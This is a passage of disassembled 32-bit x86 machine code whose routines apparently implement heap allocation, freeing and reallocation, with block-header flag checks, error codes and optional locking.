  402393:	83 c4 ec             	add    $0xffffffec,%esp
  402396:	53                   	push   %ebx
  402397:	8b d8                	mov    %eax,%ebx
  402399:	80 3d bc d5 41 00 00 	cmpb   $0x0,0x41d5bc
  4023a0:	75 09                	jne    0x4023ab
  4023a2:	e8 8d f7 ff ff       	call   0x401b34
  4023a7:	84 c0                	test   %al,%al
  4023a9:	74 08                	je     0x4023b3
  4023ab:	81 fb f8 ff ff 7f    	cmp    $0x7ffffff8,%ebx
  4023b1:	7e 0a                	jle    0x4023bd
  4023b3:	33 c0                	xor    %eax,%eax
  4023b5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4023b8:	e9 76 01 00 00       	jmp    0x402533
  4023bd:	33 d2                	xor    %edx,%edx
  4023bf:	55                   	push   %ebp
  4023c0:	68 2c 25 40 00       	push   $0x40252c
  4023c5:	64 ff 32             	push   %fs:(%edx)
  4023c8:	64 89 22             	mov    %esp,%fs:(%edx)
  4023cb:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  4023d2:	74 0a                	je     0x4023de
  4023d4:	68 c4 d5 41 00       	push   $0x41d5c4
  4023d9:	e8 36 ef ff ff       	call   0x401314
  4023de:	83 c3 07             	add    $0x7,%ebx
  4023e1:	83 e3 fc             	and    $0xfffffffc,%ebx
  4023e4:	83 fb 0c             	cmp    $0xc,%ebx
  4023e7:	7d 05                	jge    0x4023ee
  4023e9:	bb 0c 00 00 00       	mov    $0xc,%ebx
  4023ee:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  4023f4:	0f 8f ac 00 00 00    	jg     0x4024a6
  4023fa:	8b c3                	mov    %ebx,%eax
  4023fc:	85 c0                	test   %eax,%eax
  4023fe:	79 03                	jns    0x402403
  402400:	83 c0 03             	add    $0x3,%eax
  402403:	c1 f8 02             	sar    $0x2,%eax
  402406:	8b 15 1c d6 41 00    	mov    0x41d61c,%edx
  40240c:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  402410:	89 55 f8             	mov    %edx,-0x8(%ebp)
  402413:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402417:	0f 84 89 00 00 00    	je     0x4024a6
  40241d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402420:	03 d3                	add    %ebx,%edx
  402422:	89 55 ec             	mov    %edx,-0x14(%ebp)
  402425:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402428:	83 22 fe             	andl   $0xfffffffe,(%edx)
  40242b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40242e:	8b 52 04             	mov    0x4(%edx),%edx
  402431:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402434:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402437:	3b 55 f8             	cmp    -0x8(%ebp),%edx
  40243a:	75 0e                	jne    0x40244a
  40243c:	8b 15 1c d6 41 00    	mov    0x41d61c,%edx
  402442:	33 c9                	xor    %ecx,%ecx
  402444:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  402448:	eb 26                	jmp    0x402470
  40244a:	8b 15 1c d6 41 00    	mov    0x41d61c,%edx
  402450:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402453:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  402457:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40245a:	8b 00                	mov    (%eax),%eax
  40245c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40245f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402462:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402465:	89 50 04             	mov    %edx,0x4(%eax)
  402468:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40246b:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40246e:	89 10                	mov    %edx,(%eax)
  402470:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402473:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402476:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402479:	8b 40 08             	mov    0x8(%eax),%eax
  40247c:	83 c8 02             	or     $0x2,%eax
  40247f:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402482:	89 02                	mov    %eax,(%edx)
  402484:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402487:	83 c0 04             	add    $0x4,%eax
  40248a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40248d:	ff 05 ac d5 41 00    	incl   0x41d5ac
  402493:	83 eb 04             	sub    $0x4,%ebx
  402496:	01 1d b0 d5 41 00    	add    %ebx,0x41d5b0
  40249c:	e8 d7 20 00 00       	call   0x404578
  4024a1:	e9 8d 00 00 00       	jmp    0x402533
  4024a6:	3b 1d 14 d6 41 00    	cmp    0x41d614,%ebx
  4024ac:	7f 53                	jg     0x402501
  4024ae:	29 1d 14 d6 41 00    	sub    %ebx,0x41d614
  4024b4:	83 3d 14 d6 41 00 0c 	cmpl   $0xc,0x41d614
  4024bb:	7d 0d                	jge    0x4024ca
  4024bd:	03 1d 14 d6 41 00    	add    0x41d614,%ebx
  4024c3:	33 c0                	xor    %eax,%eax
  4024c5:	a3 14 d6 41 00       	mov    %eax,0x41d614
  4024ca:	a1 18 d6 41 00       	mov    0x41d618,%eax
  4024cf:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4024d2:	01 1d 18 d6 41 00    	add    %ebx,0x41d618
  4024d8:	8b c3                	mov    %ebx,%eax
  4024da:	83 c8 02             	or     $0x2,%eax
  4024dd:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4024e0:	89 02                	mov    %eax,(%edx)
  4024e2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4024e5:	83 c0 04             	add    $0x4,%eax
  4024e8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024eb:	ff 05 ac d5 41 00    	incl   0x41d5ac
  4024f1:	83 eb 04             	sub    $0x4,%ebx
  4024f4:	01 1d b0 d5 41 00    	add    %ebx,0x41d5b0
  4024fa:	e8 79 20 00 00       	call   0x404578
  4024ff:	eb 32                	jmp    0x402533
  402501:	8b c3                	mov    %ebx,%eax
  402503:	e8 40 fd ff ff       	call   0x402248
  402508:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40250b:	33 c0                	xor    %eax,%eax
  40250d:	5a                   	pop    %edx
  40250e:	59                   	pop    %ecx
  40250f:	59                   	pop    %ecx
  402510:	64 89 10             	mov    %edx,%fs:(%eax)
  402513:	68 33 25 40 00       	push   $0x402533
  402518:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  40251f:	74 0a                	je     0x40252b
  402521:	68 c4 d5 41 00       	push   $0x41d5c4
  402526:	e8 f1 ed ff ff       	call   0x40131c
  40252b:	c3                   	ret
  40252c:	e9 63 1f 00 00       	jmp    0x404494
  402531:	eb e5                	jmp    0x402518
  402533:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402536:	5b                   	pop    %ebx
  402537:	8b e5                	mov    %ebp,%esp
  402539:	5d                   	pop    %ebp
  40253a:	c3                   	ret
  40253b:	90                   	nop
  40253c:	55                   	push   %ebp
  40253d:	8b ec                	mov    %esp,%ebp
  40253f:	83 c4 f0             	add    $0xfffffff0,%esp
  402542:	53                   	push   %ebx
  402543:	8b d8                	mov    %eax,%ebx
  402545:	33 c0                	xor    %eax,%eax
  402547:	a3 c0 d5 41 00       	mov    %eax,0x41d5c0
  40254c:	80 3d bc d5 41 00 00 	cmpb   $0x0,0x41d5bc
  402553:	75 1f                	jne    0x402574
  402555:	e8 da f5 ff ff       	call   0x401b34
  40255a:	84 c0                	test   %al,%al
  40255c:	75 16                	jne    0x402574
  40255e:	c7 05 c0 d5 41 00 08 	movl   $0x8,0x41d5c0
  402565:	00 00 00 
  402568:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  40256f:	e9 96 01 00 00       	jmp    0x40270a
  402574:	33 d2                	xor    %edx,%edx
  402576:	55                   	push   %ebp
  402577:	68 03 27 40 00       	push   $0x402703
  40257c:	64 ff 32             	push   %fs:(%edx)
  40257f:	64 89 22             	mov    %esp,%fs:(%edx)
  402582:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  402589:	74 0a                	je     0x402595
  40258b:	68 c4 d5 41 00       	push   $0x41d5c4
  402590:	e8 7f ed ff ff       	call   0x401314
  402595:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402598:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40259b:	83 e8 04             	sub    $0x4,%eax
  40259e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4025a1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4025a4:	8b 18                	mov    (%eax),%ebx
  4025a6:	f6 c3 02             	test   $0x2,%bl
  4025a9:	75 0f                	jne    0x4025ba
  4025ab:	c7 05 c0 d5 41 00 09 	movl   $0x9,0x41d5c0
  4025b2:	00 00 00 
  4025b5:	e9 20 01 00 00       	jmp    0x4026da
  4025ba:	ff 0d ac d5 41 00    	decl   0x41d5ac
  4025c0:	8b c3                	mov    %ebx,%eax
  4025c2:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4025c7:	83 e8 04             	sub    $0x4,%eax
  4025ca:	29 05 b0 d5 41 00    	sub    %eax,0x41d5b0
  4025d0:	f6 c3 01             	test   $0x1,%bl
  4025d3:	74 53                	je     0x402628
  4025d5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4025d8:	83 e8 0c             	sub    $0xc,%eax
  4025db:	8b 40 08             	mov    0x8(%eax),%eax
  4025de:	83 f8 0c             	cmp    $0xc,%eax
  4025e1:	7c 07                	jl     0x4025ea
  4025e3:	a9 03 00 00 80       	test   $0x80000003,%eax
  4025e8:	74 0f                	je     0x4025f9
  4025ea:	c7 05 c0 d5 41 00 0a 	movl   $0xa,0x41d5c0
  4025f1:	00 00 00 
  4025f4:	e9 e1 00 00 00       	jmp    0x4026da
  4025f9:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4025fc:	2b d0                	sub    %eax,%edx
  4025fe:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402601:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402604:	3b 42 08             	cmp    0x8(%edx),%eax
  402607:	74 0f                	je     0x402618
  402609:	c7 05 c0 d5 41 00 0a 	movl   $0xa,0x41d5c0
  402610:	00 00 00 
  402613:	e9 c2 00 00 00       	jmp    0x4026da
  402618:	03 d8                	add    %eax,%ebx
  40261a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40261d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402620:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402623:	e8 e4 f6 ff ff       	call   0x401d0c
  402628:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  40262e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402631:	03 c3                	add    %ebx,%eax
  402633:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402636:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402639:	3b 05 18 d6 41 00    	cmp    0x41d618,%eax
  40263f:	75 2c                	jne    0x40266d
  402641:	29 1d 18 d6 41 00    	sub    %ebx,0x41d618
  402647:	01 1d 14 d6 41 00    	add    %ebx,0x41d614
  40264d:	81 3d 14 d6 41 00 00 	cmpl   $0x3c00,0x41d614
  402654:	3c 00 00 
  402657:	7e 05                	jle    0x40265e
  402659:	e8 7a fa ff ff       	call   0x4020d8
  40265e:	33 c0                	xor    %eax,%eax
  402660:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402663:	e8 10 1f 00 00       	call   0x404578
  402668:	e9 9d 00 00 00       	jmp    0x40270a
  40266d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402670:	8b 00                	mov    (%eax),%eax
  402672:	a8 02                	test   $0x2,%al
  402674:	74 1e                	je     0x402694
  402676:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40267b:	83 f8 04             	cmp    $0x4,%eax
  40267e:	7d 0c                	jge    0x40268c
  402680:	c7 05 c0 d5 41 00 0b 	movl   $0xb,0x41d5c0
  402687:	00 00 00 
  40268a:	eb 4e                	jmp    0x4026da
  40268c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40268f:	83 08 01             	orl    $0x1,(%eax)
  402692:	eb 3c                	jmp    0x4026d0
  402694:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402697:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40269a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40269d:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4026a1:	74 11                	je     0x4026b4
  4026a3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4026a6:	83 38 00             	cmpl   $0x0,(%eax)
  4026a9:	74 09                	je     0x4026b4
  4026ab:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4026ae:	83 78 08 0c          	cmpl   $0xc,0x8(%eax)
  4026b2:	7d 0c                	jge    0x4026c0
  4026b4:	c7 05 c0 d5 41 00 0b 	movl   $0xb,0x41d5c0
  4026bb:	00 00 00 
  4026be:	eb 1a                	jmp    0x4026da
  4026c0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4026c3:	8b 40 08             	mov    0x8(%eax),%eax
  4026c6:	03 d8                	add    %eax,%ebx
  4026c8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4026cb:	e8 3c f6 ff ff       	call   0x401d0c
  4026d0:	8b d3                	mov    %ebx,%edx
  4026d2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4026d5:	e8 06 f9 ff ff       	call   0x401fe0
  4026da:	a1 c0 d5 41 00       	mov    0x41d5c0,%eax
  4026df:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4026e2:	33 c0                	xor    %eax,%eax
  4026e4:	5a                   	pop    %edx
  4026e5:	59                   	pop    %ecx
  4026e6:	59                   	pop    %ecx
  4026e7:	64 89 10             	mov    %edx,%fs:(%eax)
  4026ea:	68 0a 27 40 00       	push   $0x40270a
  4026ef:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  4026f6:	74 0a                	je     0x402702
  4026f8:	68 c4 d5 41 00       	push   $0x41d5c4
  4026fd:	e8 1a ec ff ff       	call   0x40131c
  402702:	c3                   	ret
  402703:	e9 8c 1d 00 00       	jmp    0x404494
  402708:	eb e5                	jmp    0x4026ef
  40270a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40270d:	5b                   	pop    %ebx
  40270e:	8b e5                	mov    %ebp,%esp
  402710:	5d                   	pop    %ebp
  402711:	c3                   	ret
  402712:	8b c0                	mov    %eax,%eax
  402714:	53                   	push   %ebx
  402715:	56                   	push   %esi
  402716:	57                   	push   %edi
  402717:	55                   	push   %ebp
  402718:	83 c4 f4             	add    $0xfffffff4,%esp
  40271b:	8b da                	mov    %edx,%ebx
  40271d:	83 c3 07             	add    $0x7,%ebx
  402720:	83 e3 fc             	and    $0xfffffffc,%ebx
  402723:	83 fb 0c             	cmp    $0xc,%ebx
  402726:	7d 05                	jge    0x40272d
  402728:	bb 0c 00 00 00       	mov    $0xc,%ebx
  40272d:	83 e8 04             	sub    $0x4,%eax
  402730:	89 04 24             	mov    %eax,(%esp)
  402733:	8b 04 24             	mov    (%esp),%eax
  402736:	8b 30                	mov    (%eax),%esi
  402738:	81 e6 fc ff ff 7f    	and    $0x7ffffffc,%esi
  40273e:	8b 04 24             	mov    (%esp),%eax
  402741:	03 c6                	add    %esi,%eax
  402743:	89 44 24 04          	mov    %eax,0x4(%esp)
  402747:	3b f3                	cmp    %ebx,%esi
  402749:	75 07                	jne    0x402752
  40274b:	b0 01                	mov    $0x1,%al
  40274d:	e9 bd 01 00 00       	jmp    0x40290f
  402752:	3b f3                	cmp    %ebx,%esi
  402754:	0f 8e 90 00 00 00    	jle    0x4027ea
  40275a:	8b ee                	mov    %esi,%ebp
  40275c:	2b eb                	sub    %ebx,%ebp
  40275e:	8b 54 24 04          	mov    0x4(%esp),%edx
  402762:	3b 15 18 d6 41 00    	cmp    0x41d618,%edx
  402768:	75 2c                	jne    0x402796
  40276a:	29 2d 18 d6 41 00    	sub    %ebp,0x41d618
  402770:	01 2d 14 d6 41 00    	add    %ebp,0x41d614
  402776:	83 3d 14 d6 41 00 0c 	cmpl   $0xc,0x41d614
  40277d:	0f 8d 6f 01 00 00    	jge    0x4028f2
  402783:	01 2d 18 d6 41 00    	add    %ebp,0x41d618
  402789:	29 2d 14 d6 41 00    	sub    %ebp,0x41d614
  40278f:	8b de                	mov    %esi,%ebx
  402791:	e9 5c 01 00 00       	jmp    0x4028f2
  402796:	89 44 24 04          	mov    %eax,0x4(%esp)
  40279a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40279e:	f6 00 02             	testb  $0x2,(%eax)
  4027a1:	75 18                	jne    0x4027bb
  4027a3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4027a7:	89 44 24 08          	mov    %eax,0x8(%esp)
  4027ab:	8b 44 24 08          	mov    0x8(%esp),%eax
  4027af:	03 68 08             	add    0x8(%eax),%ebp
  4027b2:	8b 44 24 08          	mov    0x8(%esp),%eax
  4027b6:	e8 51 f5 ff ff       	call   0x401d0c
  4027bb:	83 fd 0c             	cmp    $0xc,%ebp
  4027be:	7c 23                	jl     0x4027e3
  4027c0:	8b 04 24             	mov    (%esp),%eax
  4027c3:	03 c3                	add    %ebx,%eax
  4027c5:	89 44 24 04          	mov    %eax,0x4(%esp)
  4027c9:	83 cd 02             	or     $0x2,%ebp
  4027cc:	8b 44 24 04          	mov    0x4(%esp),%eax
  4027d0:	89 28                	mov    %ebp,(%eax)
  4027d2:	8b 44 24 04          	mov    0x4(%esp),%eax
  4027d6:	83 c0 04             	add    $0x4,%eax
  4027d9:	e8 42 f6 ff ff       	call   0x401e20
  4027de:	e9 0f 01 00 00       	jmp    0x4028f2
  4027e3:	8b de                	mov    %esi,%ebx
  4027e5:	e9 08 01 00 00       	jmp    0x4028f2
  4027ea:	8b fb                	mov    %ebx,%edi
  4027ec:	2b fe                	sub    %esi,%edi
  4027ee:	8b 44 24 04          	mov    0x4(%esp),%eax
  4027f2:	3b 05 18 d6 41 00    	cmp    0x41d618,%eax
  4027f8:	75 65                	jne    0x40285f
  4027fa:	3b 3d 14 d6 41 00    	cmp    0x41d614,%edi
  402800:	7f 4f                	jg     0x402851
  402802:	29 3d 14 d6 41 00    	sub    %edi,0x41d614
  402808:	01 3d 18 d6 41 00    	add    %edi,0x41d618
  40280e:	83 3d 14 d6 41 00 0c 	cmpl   $0xc,0x41d614
  402815:	7d 18                	jge    0x40282f
  402817:	a1 14 d6 41 00       	mov    0x41d614,%eax
  40281c:	01 05 18 d6 41 00    	add    %eax,0x41d618
  402822:	03 1d 14 d6 41 00    	add    0x41d614,%ebx
  402828:	33 c0                	xor    %eax,%eax
  40282a:	a3 14 d6 41 00       	mov    %eax,0x41d614
  40282f:	8b c3                	mov    %ebx,%eax
  402831:	2b c6                	sub    %esi,%eax
  402833:	01 05 b0 d5 41 00    	add    %eax,0x41d5b0
  402839:	8b 04 24             	mov    (%esp),%eax
  40283c:	8b 00                	mov    (%eax),%eax
  40283e:	25 03 00 00 80       	and    $0x80000003,%eax
  402843:	0b d8                	or     %eax,%ebx
  402845:	8b 04 24             	mov    (%esp),%eax
  402848:	89 18                	mov    %ebx,(%eax)
  40284a:	b0 01                	mov    $0x1,%al
  40284c:	e9 be 00 00 00       	jmp    0x40290f
  402851:	e8 82 f8 ff ff       	call   0x4020d8
  402856:	8b 04 24             	mov    (%esp),%eax
  402859:	03 c6                	add    %esi,%eax
  40285b:	89 44 24 04          	mov    %eax,0x4(%esp)
  40285f:	8b 44 24 04          	mov    0x4(%esp),%eax
  402863:	f6 00 02             	testb  $0x2,(%eax)
  402866:	75 4f                	jne    0x4028b7
  402868:	8b 44 24 04          	mov    0x4(%esp),%eax
  40286c:	89 44 24 08          	mov    %eax,0x8(%esp)
  402870:	8b 54 24 08          	mov    0x8(%esp),%edx
  402874:	8b 6a 08             	mov    0x8(%edx),%ebp
  402877:	3b fd                	cmp    %ebp,%edi
  402879:	7e 0a                	jle    0x402885
  40287b:	03 c5                	add    %ebp,%eax
  40287d:	89 44 24 04          	mov    %eax,0x4(%esp)
  402881:	2b fd                	sub    %ebp,%edi
  402883:	eb 32                	jmp    0x4028b7
  402885:	8b 44 24 08          	mov    0x8(%esp),%eax
  402889:	e8 7e f4 ff ff       	call   0x401d0c
  40288e:	2b ef                	sub    %edi,%ebp
  402890:	83 fd 0c             	cmp    $0xc,%ebp
  402893:	7c 0e                	jl     0x4028a3
  402895:	8b 04 24             	mov    (%esp),%eax
  402898:	03 c3                	add    %ebx,%eax
  40289a:	8b d5                	mov    %ebp,%edx
  40289c:	e8 3f f7 ff ff       	call   0x401fe0
  4028a1:	eb 4f                	jmp    0x4028f2
  4028a3:	03 dd                	add    %ebp,%ebx
  4028a5:	8b 04 24             	mov    (%esp),%eax
  4028a8:	03 c3                	add    %ebx,%eax
  4028aa:	89 44 24 04          	mov    %eax,0x4(%esp)
  4028ae:	8b 44 24 04          	mov    0x4(%esp),%eax
  4028b2:	83 20 fe             	andl   $0xfffffffe,(%eax)
  4028b5:	eb 3b                	jmp    0x4028f2
  4028b7:	8b 44 24 04          	mov    0x4(%esp),%eax
  4028bb:	8b 00                	mov    (%eax),%eax
  4028bd:	a9 00 00 00 80       	test   $0x80000000,%eax
  4028c2:	74 2a                	je     0x4028ee
  4028c4:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4028c9:	03 44 24 04          	add    0x4(%esp),%eax
  4028cd:	89 44 24 04          	mov    %eax,0x4(%esp)
  4028d1:	8b d7                	mov    %edi,%edx
  4028d3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4028d7:	e8 00 f9 ff ff       	call   0x4021dc
  4028dc:	84 c0                	test   %al,%al
  4028de:	74 0e                	je     0x4028ee
  4028e0:	8b 04 24             	mov    (%esp),%eax
  4028e3:	03 c6                	add    %esi,%eax
  4028e5:	89 44 24 04          	mov    %eax,0x4(%esp)
  4028e9:	e9 fc fe ff ff       	jmp    0x4027ea
  4028ee:	33 c0                	xor    %eax,%eax
  4028f0:	eb 1d                	jmp    0x40290f
  4028f2:	8b c3                	mov    %ebx,%eax
  4028f4:	2b c6                	sub    %esi,%eax
  4028f6:	01 05 b0 d5 41 00    	add    %eax,0x41d5b0
  4028fc:	8b 04 24             	mov    (%esp),%eax
  4028ff:	8b 00                	mov    (%eax),%eax
  402901:	25 03 00 00 80       	and    $0x80000003,%eax
  402906:	0b d8                	or     %eax,%ebx
  402908:	8b 04 24             	mov    (%esp),%eax
  40290b:	89 18                	mov    %ebx,(%eax)
  40290d:	b0 01                	mov    $0x1,%al
  40290f:	83 c4 0c             	add    $0xc,%esp
  402912:	5d                   	pop    %ebp
  402913:	5f                   	pop    %edi
  402914:	5e                   	pop    %esi
  402915:	5b                   	pop    %ebx
  402916:	c3                   	ret
  402917:	90                   	nop
  402918:	55                   	push   %ebp
  402919:	8b ec                	mov    %esp,%ebp
  40291b:	83 c4 f8             	add    $0xfffffff8,%esp
  40291e:	53                   	push   %ebx
  40291f:	56                   	push   %esi
  402920:	8b f2                	mov    %edx,%esi
  402922:	8b d8                	mov    %eax,%ebx
  402924:	80 3d bc d5 41 00 00 	cmpb   $0x0,0x41d5bc
  40292b:	75 13                	jne    0x402940
  40292d:	e8 02 f2 ff ff       	call   0x401b34
  402932:	84 c0                	test   %al,%al
  402934:	75 0a                	jne    0x402940
  402936:	33 c0                	xor    %eax,%eax
  402938:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40293b:	e9 98 00 00 00       	jmp    0x4029d8
  402940:	33 d2                	xor    %edx,%edx
  402942:	55                   	push   %ebp
  402943:	68 d1 29 40 00       	push   $0x4029d1
  402948:	64 ff 32             	push   %fs:(%edx)
  40294b:	64 89 22             	mov    %esp,%fs:(%edx)
  40294e:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  402955:	74 0a                	je     0x402961
  402957:	68 c4 d5 41 00       	push   $0x41d5c4
  40295c:	e8 b3 e9 ff ff       	call   0x401314
  402961:	8b d6                	mov    %esi,%edx
  402963:	8b c3                	mov    %ebx,%eax
  402965:	e8 aa fd ff ff       	call   0x402714
  40296a:	84 c0                	test   %al,%al
  40296c:	74 05                	je     0x402973
  40296e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402971:	eb 3d                	jmp    0x4029b0
  402973:	8b c6                	mov    %esi,%eax
  402975:	e8 16 fa ff ff       	call   0x402390
  40297a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40297d:	8b c3                	mov    %ebx,%eax
  40297f:	83 e8 04             	sub    $0x4,%eax
  402982:	8b 00                	mov    (%eax),%eax
  402984:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  402989:	83 e8 04             	sub    $0x4,%eax
  40298c:	3b f0                	cmp    %eax,%esi
  40298e:	7d 02                	jge    0x402992
  402990:	8b c6                	mov    %esi,%eax
  402992:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402996:	74 12                	je     0x4029aa
  402998:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40299b:	8b cb                	mov    %ebx,%ecx
  40299d:	91                   	xchg   %eax,%ecx
  40299e:	e8 c5 02 00 00       	call   0x402c68
  4029a3:	8b c3                	mov    %ebx,%eax
  4029a5:	e8 92 fb ff ff       	call   0x40253c
  4029aa:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4029ad:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4029b0:	33 c0                	xor    %eax,%eax
  4029b2:	5a                   	pop    %edx
  4029b3:	59                   	pop    %ecx
  4029b4:	59                   	pop    %ecx
  4029b5:	64 89 10             	mov    %edx,%fs:(%eax)
  4029b8:	68 d8 29 40 00       	push   $0x4029d8
  4029bd:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  4029c4:	74 0a                	je     0x4029d0
  4029c6:	68 c4 d5 41 00       	push   $0x41d5c4
  4029cb:	e8 4c e9 ff ff       	call   0x40131c
  4029d0:	c3                   	ret
  4029d1:	e9 be 1a 00 00       	jmp    0x404494
  4029d6:	eb e5                	jmp    0x4029bd
  4029d8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4029db:	5e                   	pop    %esi
  4029dc:	5b                   	pop    %ebx
  4029dd:	59                   	pop    %ecx
  4029de:	59                   	pop    %ecx
  4029df:	5d                   	pop    %ebp
  4029e0:	c3                   	ret
  4029e1:	8d 40 00             	lea    0x0(%eax),%eax
  4029e4:	53                   	push   %ebx
  4029e5:	51                   	push   %ecx
  4029e6:	8b d8                	mov    %eax,%ebx
  4029e8:	85 db                	test   %ebx,%ebx
  4029ea:	7e 1a                	jle    0x402a06
  4029ec:	8b c3                	mov    %ebx,%eax
  4029ee:	ff 15 3c c0 41 00    	call   *0x41c03c
  4029f4:	89 04 24             	mov    %eax,(%esp)
  4029f7:	83 3c 24 00          	cmpl   $0x0,(%esp)
  4029fb:	75 0e                	jne    0x402a0b
  4029fd:	b0 01                	mov    $0x1,%al
  4029ff:	e8 d8 00 00 00       	call   0x402adc
  402a04:	eb 05                	jmp    0x402a0b
  402a06:	33 c0                	xor    %eax,%eax
  402a08:	89 04 24             	mov    %eax,(%esp)
  402a0b:	8b 04 24             	mov    (%esp),%eax
  402a0e:	5a                   	pop    %edx
  402a0f:	5b                   	pop    %ebx
  402a10:	c3                   	ret
  402a11:	8d 40 00             	lea    0x0(%eax),%eax
  402a14:	53                   	push   %ebx
  402a15:	85 c0                	test   %eax,%eax
  402a17:	74 15                	je     0x402a2e
  402a19:	ff 15 40 c0 41 00    	call   *0x41c040
  402a1f:	8b d8                	mov    %eax,%ebx
  402a21:	85 db                	test   %ebx,%ebx
  402a23:	74 0b                	je     0x402a30
  402a25:	b0 02                	mov    $0x2,%al
  402a27:	e8 b0 00 00 00       	call   0x402adc
  402a2c:	eb 02                	jmp    0x402a30
  402a2e:	33 db                	xor    %ebx,%ebx
  402a30:	8b c3                	mov    %ebx,%eax
  402a32:	5b                   	pop    %ebx
  402a33:	c3                   	ret
  402a34:	8b 08                	mov    (%eax),%ecx
  402a36:	85 c9                	test   %ecx,%ecx
  402a38:	74 32                	je     0x402a6c
  402a3a:	85 d2                	test   %edx,%edx
  402a3c:	74 18                	je     0x402a56
  402a3e:	50                   	push   %eax
  402a3f:	89 c8                	mov    %ecx,%eax
  402a41:	ff 15 44 c0 41 00    	call   *0x41c044
  402a47:	59                   	pop    %ecx
  402a48:	09 c0                	or     %eax,%eax
  402a4a:	74 19                	je     0x402a65
  402a4c:	89 01                	mov    %eax,(%ecx)
  402a4e:	c3                   	ret
  402a4f:	b0 02                	mov    $0x2,%al
  402a51:	e9 86 00 00 00       	jmp    0x402adc
  402a56:	89 10                	mov    %edx,(%eax)
  402a58:	89 c8                	mov    %ecx,%eax
  402a5a:	ff 15 40 c0 41 00    	call   *0x41c040
  402a60:	09 c0                	or     %eax,%eax
  402a62:	75 eb                	jne    0x402a4f
  402a64:	c3                   	ret
  402a65:	b0 01                	mov    $0x1,%al
  402a67:	e9 70 00 00 00       	jmp    0x402adc
  402a6c:	85 d2                	test   %edx,%edx
  402a6e:	74 10                	je     0x402a80
  402a70:	50                   	push   %eax
  402a71:	89 d0                	mov    %edx,%eax
  402a73:	ff 15 3c c0 41 00    	call   *0x41c03c
  402a79:	59                   	pop    %ecx
  402a7a:	09 c0                	or     %eax,%eax
  402a7c:	74 e7                	je     0x402a65
  402a7e:	89 01                	mov    %eax,(%ecx)
  402a80:	c3                   	ret
  402a81:	8d 40 00             	lea    0x0(%eax),%eax
  402a84:	89 15 04 c0 41 00    	mov    %edx,0x41c004
